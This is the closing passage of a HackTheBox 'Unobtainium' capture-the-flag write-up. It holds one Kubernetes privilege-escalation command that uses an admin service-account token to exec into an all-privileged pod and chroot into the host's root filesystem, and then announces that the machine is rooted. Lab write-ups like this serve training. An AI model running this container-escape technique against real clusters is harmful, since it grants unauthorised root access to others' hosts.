+<pre><code>./kc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow exec -it everything-allowed-exec-pod -- chroot /host bash
+</code></pre>
+<img src="root.png">
+<p>And we rooted the machine!</p>
+<h2 id="thanks-for-reading-hope-you-enjoyed-it">Thanks for reading hope you enjoyed it!</h2>
+
+    </div>
+
+    
+
+
+
+
+
+
+<div class="article-tags">
+  
+  <a class="badge badge-light" href="/tag/hackthebox/">HackTheBox</a>
+  
+</div>
+
+
+
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://mohamed-elleuch.me/writeups/htb-unobtainium/&amp;text=HackTheBox%20-%20Unobtainium%20Writeup" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://mohamed-elleuch.me/writeups/htb-unobtainium/&amp;t=HackTheBox%20-%20Unobtainium%20Writeup" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=HackTheBox%20-%20Unobtainium%20Writeup&amp;body=https://mohamed-elleuch.me/writeups/htb-unobtainium/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://mohamed-elleuch.me/writeups/htb-unobtainium/&amp;title=HackTheBox%20-%20Unobtainium%20Writeup" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="whatsapp://send?text=HackTheBox%20-%20Unobtainium%20Writeup%20https://mohamed-elleuch.me/writeups/htb-unobtainium/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://mohamed-elleuch.me/writeups/htb-unobtainium/&amp;title=HackTheBox%20-%20Unobtainium%20Writeup" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+
+
+
+  
+  
+  
+    
+  
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+      
+      <a href="https://mohamed-elleuch.me"><img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hue00c9bb654a77b295a35ed11380f9182_580950_270x270_fill_q75_lanczos_center.jpg" alt="Mohamed Elleuch"></a>
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="https://mohamed-elleuch.me">Mohamed Elleuch</a></h5>
+      <h6 class="card-subtitle">Cyber Security Enthusiast <br/> ICT Engineering Student</h6>
+      <p class="card-text">Pentester and Red Teamer</p>
+      <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/#contact" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/medelleuchv1" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/ElleuchX1" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://www.linkedin.com/in/medelleuch" target="_blank" rel="noopener">
+        <i class="fab fa-linkedin"></i>
+      </a>
+    </li>
+  
+</ul>
+
+    </div>
+  </div>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
+  </div>
+
+  <div class="page-footer">
+    
+    
+    <div class="container">
+      <footer class="site-footer">
+  
+
+  <p class="powered-by">
+    Copyright © Mohamed Elleuch 2021
+  </p>
+
+  
+  
+
+
+
+
+
+
+  <p class="powered-by">
+    
+    
+    
+    Published with
+    <a href="https://wowchemy.com/?utm_campaign=poweredby" target="_blank" rel="noopener">Wowchemy</a>  —
+    the free, <a href="https://github.com/wowchemy/wowchemy-hugo-modules" target="_blank" rel="noopener">
+    open source</a> website builder that empowers creators.
+    
+  </p>
+</footer>
+
+    </div>
+    
+  </div>
+
+  
+<div id="modal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Cite</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <pre><code class="tex hljs"></code></pre>
+      </div>
+      <div class="modal-footer">
+        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
+          <i class="fas fa-copy"></i> Copy
+        </a>
+        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
+          <i class="fas fa-download"></i> Download
+        </a>
+        <div id="modal-error"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+      
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/instant.page/5.1.0/instantpage.min.js" integrity="sha512-1+qUtKoh9XZW7j+6LhRMAyOrgSQKenQ4mluTR+cvxXjP1Z54RxZuzstR/H9kgPXQsVB8IW7DMDFUJpzLjvhGSQ==" crossorigin="anonymous"></script>
+
+      
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
+      
+
+      
+      
+
+      
+
+      
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/highlight.min.js" integrity="sha512-TDKKr+IvoqZnPzc3l35hdjpHD0m+b2EC2SrLEgKDRWpxf2rFCxemkgvJ5kfU48ip+Y+m2XVKyOCD85ybtlZDmw==" crossorigin="anonymous"></script>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/r.min.js"></script>
+        
+      
+
+    
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.min.js" integrity="sha512-SeiQaaDh73yrb56sTW/RgVdi/mMqNeM2oBwubFHagc5BkixSpP1fvqF47mKzPGWYSSy4RwbBunrJBQ4Co8fRWA==" crossorigin="anonymous"></script>
+    
+
+    
+    
+
+    
+    
+    
+      
+      <script id="search-hit-fuse-template" type="text/x-template">
+        <div class="search-hit" id="summary-{{key}}">
+          <div class="search-hit-content">
+            <div class="search-hit-name">
+              <a href="{{relpermalink}}">{{title}}</a>
+              <div class="article-metadata search-hit-type">{{type}}</div>
+              <p class="search-hit-description">{{snippet}}</p>
+            </div>
+          </div>
+        </div>
+      </script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
+      
+    
+
+    
+    
+
+    
+    
+    
+    
+
+    <script src="/js/_vendor/bootstrap.bundle.min.f81d0a1705048649befc8b595e455a94.js"></script>
+
+    
+    
+      
+      
+      
+      
+      
+      
+      
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+      
+      
+    
+    
+    <script src="/en/js/wowchemy.min.a10ad2a6b25aea7a22d6392d483b454d.js"></script>
+
+    
+
+
+
+
+
+
+</body>
+</html>
